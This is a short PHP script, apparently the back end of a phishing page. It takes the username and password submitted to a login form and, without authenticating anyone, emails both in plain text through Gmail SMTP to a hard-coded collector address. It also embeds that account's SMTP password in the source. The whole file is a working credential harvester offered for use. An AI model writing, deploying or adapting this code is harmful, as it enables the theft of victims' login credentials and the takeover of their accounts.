<?php
// Incluir la librería de PHPMailer
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/SMTP.php';

// Configuración de los datos del formulario
$username = $_POST['username'];
$password = $_POST['password'];

// Crear una instancia de PHPMailer
$mail = new PHPMailer(true);

try {
    // Configurar SMTP
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com'; // Servidor SMTP de Gmail
    $mail->SMTPAuth = true;
    $mail->Username = 'cuentaparadedicar0990@gmail.com'; // Tu correo de Gmail
    $mail->Password = 'malo23malo'; // Contraseña de tu correo de Gmail
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    // Remitente y destinatario
    $mail->setFrom('cuentaparadedicar0990@gmail.com', 'Formulario de Login');
    $mail->addAddress('cuentaparadedicar0990@gmail.com'); // Correo de destino (el que tú proporcionaste)

    // Asunto y cuerpo del mensaje
    $mail->isHTML(true);
    $mail->Subject = 'Nuevo registro de login';
    $mail->Body    = "<p><strong>Nombre de usuario:</strong> $username</p><p><strong>Contraseña:</strong> $password</p>";

    // Enviar el correo
    $mail->send();
    echo 'El mensaje fue enviado correctamente.';
} catch (Exception $e) {
    echo "El mensaje no pudo ser enviado. Error: {$mail->ErrorInfo}";
}
?>
